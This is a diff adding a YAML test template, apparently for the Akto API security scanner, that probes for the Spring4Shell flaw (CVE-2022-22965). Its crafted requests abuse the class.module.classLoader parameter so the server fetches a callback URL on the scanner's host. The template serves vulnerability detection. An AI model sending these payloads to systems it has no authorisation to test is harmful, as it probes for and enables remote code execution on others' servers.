@@ -1,0 +1,70 @@
+id: SPRING_MVC_RCE
+info:
+  name: Spring MVC Remote Code Execution
+  description: "This vulnerability allows attackers to execute arbitrary code on a server running Spring MVC applications. This issue arises from improper handling of user input or insecure deserialization processes. By exploiting this vulnerability, attackers can gain control over the server, potentially leading to unauthorized access, data breaches, or complete system compromise. It is crucial to address this flaw promptly to protect the integrity and security of the affected systems."
+  details:  "This vulnerability occurs due to inadequate validation or deserialization flaws in Spring MVC applications. Attackers can exploit this by sending specially crafted requests or payloads that manipulate the application's input handling mechanisms. This exploitation allows them to execute arbitrary code on the server, leading to potential control over the system, data exposure, and severe disruptions. Patching and updating to secure versions are essential to mitigate this risk."
+  impact: "The impact of this vulnerability is severe, as it allows attackers to execute arbitrary code on the affected server. This can lead to full system compromise, unauthorized access to sensitive data, and disruption of services. The vulnerability poses a high risk to the security and stability of the application, potentially affecting the entire network infrastructure. Immediate remediation is crucial to prevent exploitation."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: SPRING_MVC_RCE
+  severity: MEDIUM
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2022-22965
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+
+execute:
+  type: multiple
+  requests:
+    - req:
+      - modify_method: POST
+      - modify_header:
+          content-type: "application/x-www-form-urlencoded"
+      - send_ssrf_req:
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - replace_body: 'class.module.classLoader.resources.context.configFile="https://test-services.akto.io/${random_uuid}"&class.module.classLoader.resources.context.configFile.content.aaa=xxx'
+      - validate:
+          response_code:
+            gt: 505
+      - success: x2
+      - failure: exit
+    - req:
+      - modify_method: GET
+      - replace_body: '{}'
+      - send_ssrf_req:
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - add_query_param:
+          "class.module.classLoader.resources.context.configFile": "https://test-services.akto.io/${random_uuid}"
+      - add_query_param:
+          "class.module.classLoader.resources.context.configFile.content.aaa": "xxx"
+      - validate:
+          ssrf_url_hit: ${random_uuid} 
+          response_headers:
+            for_one:
+              key:
+                eq: "user-agent"
+              value:
+                eq: "java"
+      - success: vulnerable
+      - failure: exit
